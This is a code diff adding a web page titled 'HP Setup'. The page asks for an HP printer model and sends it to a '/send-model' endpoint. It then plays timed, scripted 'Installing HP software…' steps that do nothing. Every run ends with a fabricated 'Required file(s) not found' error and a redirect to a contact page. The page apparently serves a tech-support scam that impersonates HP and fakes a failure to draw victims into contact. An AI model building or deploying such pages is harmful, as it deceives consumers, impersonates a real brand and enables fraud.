@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>HP Setup</title>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: #f4f4f4;
+    }
+
+    .box {
+      width: 420px;
+      margin: 80px auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 6px;
+    }
+
+    .spinner {
+      width: 40px;
+      height: 40px;
+      border: 4px solid #ddd;
+      border-top: 4px solid #000;
+      border-radius: 50%;
+      margin: 15px auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="box">
+
+<div id="formBox">
+  <h3>Enter HP Printer Model</h3>
+  <input id="printerModel" placeholder="e.g. HP LaserJet 1020">
+  <button id="startBtn">Start Setup</button>
+</div>
+
+<div id="loadingBox" style="display:none;">
+  <h3>Processing HP Printer…</h3>
+  <div id="stepContent"></div>
+</div>
+
+</div>
+
+<script>
+document.getElementById("startBtn").addEventListener("click", async function () {
+
+  const model = document.getElementById("printerModel").value.trim();
+  
+  if (!model) {
+    alert("Please enter printer model");
+    return;
+  }
+
+  // Save model for contact page
+  sessionStorage.setItem("printerModel", model);
+
+  // 🔥 SEND MODEL MAIL (FIRST MAIL)
+  try {
+    await fetch("/send-model", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        printerModel: model,
+        brand: "HP"
+      })
+    });
+  } catch (e) {
+    console.log("Model mail failed (non-blocking)");
+  }
+
+  // UI switch
+  document.getElementById("formBox").style.display = "none";
+  document.getElementById("loadingBox").style.display = "block";
+
+  const steps = [
+    "Detecting HP connection…",
+    "Checking HP requirements…",
+    "Preparing HP install…",
+    "Installing HP software…",
+    "Required file(s) not found"
+  ];
+
+  let i = 0;
+  function next() {
+    document.getElementById("stepContent").innerText = steps[i];
+    i++;
+    if (i < steps.length) {
+      setTimeout(next, 2500);
+    } else {
+      setTimeout(() => {
+        window.location.href = "/contact";
+      }, 2500);
+    }
+  }
+
+  next();
+});
+</script>
+
+</body>
+</html>
